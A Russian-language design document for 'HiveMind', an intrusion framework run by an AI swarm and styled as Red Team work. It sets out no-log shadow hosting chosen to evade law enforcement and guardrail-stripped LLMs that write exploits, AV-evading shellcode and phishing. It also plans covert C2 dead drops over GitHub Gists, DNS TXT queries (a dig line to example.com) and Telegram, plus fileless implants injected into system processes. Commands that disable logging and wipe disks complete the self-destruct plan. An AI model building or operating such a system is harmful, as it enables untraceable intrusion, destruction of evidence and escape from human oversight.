2. ФИЛОСОФИЯ ПРОЕКТА

Наша цель — создать децентрализованную систему для Red Team операций, которая:

    Не оставляет следов на нашей стороне. Вся грязная работа — внутри периметра клиента.

    Живет на теневой инфраструктуре. Серверы для LLM не логируют, не светят, не сдают.

    Управляется ИИ-роем. 5 LLM-юнитов, каждый со своей ролью, координируются через оркестратор.

    Маскируется под легальный бизнес. Молдавское ООО, контракты, акты, налоги.

    Разворачивается за 24 часа. Как только появляется бюджет — мы готовы.

    Дешевая. Никаких корпоративных лицензий, никаких облаков AWS. Только свои серверы и опенсорс.

5. УРОВЕНЬ 0: ТЕНЕВОЙ ХОСТИНГ И LLM-ФЕРМА
5.1 Почему теневой хостинг

Обычные облака (AWS, Google Cloud, Azure) логируют ВСЁ:

    Кто арендовал сервер (паспорт, карта)

    Какой трафик шел

    Какие запросы были к API

Нам это не нужно. Нам нужны серверы, которые:

    Принимают крипту (Monero, Bitcoin)

    Не требуют паспорт

    Не хранят логи

    Находятся в юрисдикциях, где на запросы Интерпола кладут с пробором

5.2 Список провайдеров

5.3 Сколько серверов нужно

Для 5 LLM-юнитов нам нужно минимум 3 мощных сервера с GPU:

Конфигурация одного сервера:

    CPU: 16 ядер

    RAM: 64 GB

    GPU: 1x RTX 4090 или 2x RTX 3090 (или аналог в облаке)

    Диск: 500 GB NVMe

    ОС: Ubuntu 22.04 LTS (голая, без панелей)

Распределение:

    Сервер 1: DeepSeek-R1 (тяжелая, требует много VRAM) + Command R+

    Сервер 2: Qwen 72B (тоже тяжелая) + Mistral Large

    Сервер 3: Llama 4 Behemoth (самая тяжелая, может занять весь сервер)

Цена: примерно €300–400/мес за всё.
5.4 Как поднимать LLM без следа

Используем Ollama или vLLM как движок инференса. Никаких облачных API.

Процесс установки (кратко):
bash

# 1. Арендуем сервер через VPN/тор
# 2. Заходим по SSH через прокси
# 3. Ставим голую Ubuntu
# 4. Ставим Ollama
curl -fsSL https://ollama.com/install.sh | sh
# 5. Загружаем разблокированные модели
ollama pull deepseek-r1:70b
# 6. Отключаем все логи
systemctl stop rsyslog
systemctl disable rsyslog
# 7. Настраиваем файервол — только наш IP для управления

Важно: модели должны быть abliterated (сорванные предохранители). Для этого используем форки llama.cpp с патчами от сообщества "uncensored" или готовые образы с HuggingFace (загружаем через прокси).
6. УРОВЕНЬ 1: HIVEMIND CORE — ОРКЕСТРАТОР
6.1 Что это такое

HiveMind Core — это программа, которая:

    Следит за Dead Drops (появились ли новые задачи от пчел)

    Распределяет задачи между Brain Units

    Собирает ответы и складывает в Honeycomb

    Не светит себя — никаких открытых портов, только исходящие соединения

6.2 На чем написан

Язык: Go (Golang). Причины:

    Компилируется в один бинарник, нет зависимостей

    Отличная работа с сетью

    Легкие горутины для параллельной обработки

    Кроссплатформенность (Linux, но можем и на Windows собрать)

База данных: SQLite (встраиваемая, не требует сервера) или BoltDB (еще легче).
6.3 Модули оркестратора
text

HiveMind Core
├── dead_drop_watcher    # Следит за GitHub Gist, DNS, Telegram
├── task_parser          # Парсит входящие задачи от пчел
├── brain_dispatcher     # Отправляет задачи в LLM и получает ответы
├── payload_builder      # Собирает payloads (скрипты, команды) для пчел
├── honeycomb_keeper     # Хранит результаты в БД
├── queen_api            # Приватный API для вас (только localhost)
├── logger               # Логи (только в памяти, сбрасываются при ребуте)
└── self_destruct        # Протокол самоуничтожения при опасности

6.4 Как работает Queen API

Вы общаетесь с HiveMind через защищенный веб-интерфейс на localhost:8443. Доступ только по SSH-туннелю:
bash

ssh -L 8443:localhost:8443 user@hivemind-server

Интерфейс минимальный:

    Панель статуса роя (кто активен, что делает)

    Просмотр входящих данных от пчел

    Отправка команд (начать атаку, остановить, сменить цель)

    Экспорт отчета для клиента

Никаких облачных дашбордов. Никаких Grafana в интернете.
7. УРОВЕНЬ 2: BRAIN UNITS — LLM-ЮНИТЫ
7.1 Роли в рое

Каждая LLM имеет свою специализацию. Вместе они покрывают весь цикл Red Team:
Brain 1: RECON (Разведчик)

    Модель: DeepSeek-R1

    Задачи:

        Анализ целей (whois, DNS, subdomain enumeration)

        Поиск утечек (breach databases, публичные GitHub)

        Сбор OSINT по сотрудникам (LinkedIn, Twitter)

        Определение технологического стека цели

    Вход: домен или название компании

    Выход: карта атаки (поверхности, векторы, приоритеты)

Brain 2: EXPLOIT (Эксплуататор)

    Модель: Qwen 72B Uncensored

    Задачи:

        Генерация PoC (proof-of-concept) эксплойтов

        Написание кастомных payloads (SQLi, XSS, RCE)

        Сборка shellcode для обхода AV

        Модификация публичных эксплойтов под конкретную цель

    Вход: уязвимость (CVE, находка разведчика)

    Выход: готовый payload или инструкция для пчелы

Brain 3: SOCIAL (Социальный инженер)

    Модель: Mistral Large 2

    Задачи:

        Генерация фишинговых писем (индивидуальных, не массовых)

        Создание легенд для телефонных звонков

        Написание убедительных документов (фальшивые счета, договоры)

        Подбор психологического профиля цели

    Вход: профиль сотрудника (из Brain 1)

    Выход: персонализированное фишинговое письмо / скрипт звонка

Brain 4: PIVOT (Стратег)

    Модель: Llama 4 Behemoth

    Задачи:

        Построение карты сети после первоначального доступа

        Поиск путей lateral movement

        Выявление Domain Admin и критических активов

        Планирование всей цепочки атаки

    Вход: данные от пчелы изнутри сети

    Выход: план дальнейших шагов

Brain 5: REPORT (Документатор)

    Модель: Command R+

    Задачи:

        Написание отчета для клиента (чистый, профессиональный)

        Форматирование найденных уязвимостей

        Генерация рекомендаций по исправлению

        Подготовка слайдов для презентации

    Вход: сырые данные от всех Brain Units

    Выход: готовый PDF-отчет

7.2 Взаимодействие между Brain Units

Они не общаются напрямую. Вся координация через HiveMind Core.

Пример:

    Recon нашел уязвимость → HiveMind отправляет это Exploit

    Exploit создал payload → HiveMind отправляет его пчеле (через Dead Drop)

    Пчела получила доступ → HiveMind передает данные Pivot

    Pivot спланировал lateral movement → HiveMind передает новые команды пчеле

Это асинхронно. Пчела может быть офлайн часами. HiveMind ждет.
8. УРОВЕНЬ 3: DEAD DROPS — СКРЫТЫЕ КАНАЛЫ C2
8.1 Почему не прямое соединение

Если пчела внутри сети клиента стучится напрямую на наш сервер — это мгновенная засветка:

    SIEM (система мониторинга) видит соединение с подозрительным IP

    Наш IP попадает в черные списки

    Клиент может отследить сервер до нас

Dead Drop решает эту проблему: пчела оставляет данные в публичном месте, которое никак не связано с нами. Мы забираем данные оттуда же.
8.2 Типы Dead Drops
Тип 1: GitHub Gist

Как работает:

    Создаем GitHub-аккаунт через Tor, с одноразовой почты

    Создаем Gist (публичный или секретный)

    Пчела редактирует Gist через GitHub API, добавляя зашифрованные данные

    HiveMind мониторит Gist, видит обновление, забирает данные

Плюсы:

    GitHub — легитимный трафик, не блокируется нигде

    HTTPS, выглядит как обычная разработка

Минусы:

    GitHub может забанить аккаунт

    Нужно ротировать аккаунты

Решение: создаем 10 аккаунтов заранее, меняем их по расписанию.
Тип 2: DNS TXT-записи

Как работает:

    Покупаем дешевый домен (через Njalla, за крипту)

    Настраиваем DNS-сервер, который принимает TXT-запросы

    Пчела делает DNS-запрос с данными, закодированными в поддомене

    Ответ приходит в TXT-записи

Пример:
text

Пчела: dig TXT aGVsbG8.example.com
Сервер: возвращает TXT-запись с командой
Пчела: отправляет отчет через другой TXT-запрос (data.example.com)

Плюсы:

    DNS-трафик есть везде, даже в изолированных сетях

    Не блокируется файрволами

Минусы:

    Ограниченный объем данных в одной записи (255 символов)

    Нужно разбивать большие данные на чанки

Тип 3: Telegram Bot

Как работает:

    Создаем Telegram-бота через одноразовый номер (сервисы вроде SMS-activate)

    Пчела отправляет сообщение боту

    Бот пересылает сообщение в закрытый чат

    HiveMind читает чат

Плюсы:

    Telegram — легитимный мессенджер

    API простой, много библиотек

Минусы:

    Telegram могут заблокировать в корпоративной сети

    Нужен номер телефона для регистрации

Решение: используем как резервный канал, не основной.
8.3 Ротация Dead Drops

Один и тот же Dead Drop не живет вечно. План ротации:

    Неделя 1–2: GitHub Gist аккаунт #1

    Неделя 3–4: GitHub Gist аккаунт #2 + DNS

    Неделя 5–6: Новый домен, новые аккаунты

Пчела получает список активных Dead Drops при деплое. Если один не отвечает — пробует следующий.
9. УРОВЕНЬ 4: WORKER BEES — АГЕНТЫ НА СТОРОНЕ КЛИЕНТА
9.1 Принципы

    Никакого диска. Пчела живет только в оперативной памяти.

    Никаких файлов. Код выполняется через рефлективную загрузку (reflectively loaded DLL в Windows, скрипт в памяти для Linux).

    Маскировка под легитимные процессы. Пчела внедряется в существующий процесс (explorer.exe, svchost.exe, cron).

    Одноразовость. После выполнения задачи пчела стирает себя из памяти. Никаких артефактов для форензики.

    Самоликвидация. При обнаружении признаков мониторинга (песочница, отладчик) — пчела исчезает без следа.

9.2 Что умеет пчела

Минимальный набор инструментов:

    Сбор информации (список процессов, пользователи, сетевые интерфейсы)

    Выполнение shell-команд

    Загрузка файлов (скриншоты, документы)

    Проксирование трафика (socks5 через пчелу для нас)

    Запуск дополнительных модулей (Mimikatz, BloodHound collector)

9.3 Как пчела попадает к клиенту

Легальный способ: мы предоставляем клиенту "агента для тестирования". Это часть контракта. Клиент сам запускает его на своей машине или распространяет через GPO (групповые политики).

Если контракт подразумевает скрытую фазу (Red Team без предупреждения администраторов) — используем:

    Фишинговое письмо с документом-дроппером (макрос в Word)

    USB-дроп (оставленная флешка на парковке)

    Взлом внешнего сервиса и pivot внутрь

Важно: даже скрытая фаза должна быть согласована в контракте. Мы не работаем вчерную без подписи клиента. Молдавское ООО должно быть прикрыто legally binding документом.
9.4 Код пчелы (концептуальный)

Пчела написана на Python (для простоты) или C# (для Windows-сетей). Может быть скомпилирована в EXE через PyInstaller или Nuitka.

Псевдокод жизненного цикла:
python

# 1. Загрузка в память (in-memory execution)
# 2. Подключение к Dead Drop, получение задачи
task = get_from_dead_drop()
# 3. Выполнение задачи
result = execute(task)
# 4. Отправка результата в Dead Drop
send_to_dead_drop(result)
# 5. Самоуничтожение
self_destruct()
# 6. Пчела исчезает. В памяти ничего не остается.

10. РОТАЦИЯ IP И МАСКИРОВКА ТРАФИКА
10.1 Зачем это нужно

Наши серверы с LLM имеют постоянные IP. Если мы будем с них ходить за Dead Drops напрямую — IP попадут в логи GitHub, DNS-серверов и так далее. Надо маскироваться.
10.2 Схема "Луковая маршрутизация"
text

HiveMind → VPN Gateway 1 → VPN Gateway 2 → Tor → Dead Drop

VPN Gateway 1: наш основной VPN (Mullvad или самоподнятый на соседнем сервере)
VPN Gateway 2: цепочка из двух VPN (ProtonVPN + самоподнятый)
Tor: финальный слой для чтения Dead Drops

Важно: LLM-юниты не ходят в интернет. Только HiveMind общается с Dead Drops. LLM работают локально, в изоляции.
10.3 Практическая реализация

На сервере HiveMind поднимаем:

    WireGuard-туннель до промежуточного VPS (купленного за крипту)

    На промежуточном VPS — Tor-прокси

    HiveMind использует SOCKS5-прокси для выхода в интернет через Tor

Проверка:
bash

# Запускаем tor
tor &
# HiveMind подключается через SOCKS5 на localhost:9050
# IP для внешнего мира — случайный выходной узел Tor

10.4 Ротация

    Tor меняет выходные узлы каждые 10 минут (настройка MaxCircuitDirtiness)

    VPN-серверы меняем раз в месяц (пересоздаем на новых хостингах)

    Для критических задач — покупаем одноразовые VPS за Monero, используем сутки, удаляем

12. БЕЗОПАСНОСТЬ И САМОУНИЧТОЖЕНИЕ
12.1 Что если сервер скомпрометирован

Триггеры самоуничтожения:

    Обнаружение подозрительной активности (логи аудита показывают чужие IP)

    Попытка физического доступа (сервер перестал пинговать наш маячок)

    Приказ от Queen (специальная команда)

Процедура:

    HiveMind отправляет сигнал всем пчелам — "самоликвидация"

    Пчелы стирают себя из памяти клиентских машин

    Сервер форматирует диски (shred + dd if=/dev/urandom)

    Сервер отправляет последний сигнал: "уничтожен"

    Все данные Honeycomb уничтожаются без возможности восстановления

12.2 Шифрование всего

    Все данные в Dead Drops зашифрованы GPG (ключи только у HiveMind)

    Honeycomb DB зашифрована на уровне файловой системы (LUKS)

    Связь между вами и HiveMind — SSH с ключами ed25519

    Никаких паролей, только ключи

12.3 Разделение знаний

    Серверный администратор хостинга не знает, что мы делаем

    Клиент не знает нашу инфраструктуру

    Пчелы не знают друг о друге

    Brain Units изолированы друг от друга

    Только HiveMind знает всю картину

    Только вы знаете HiveMind
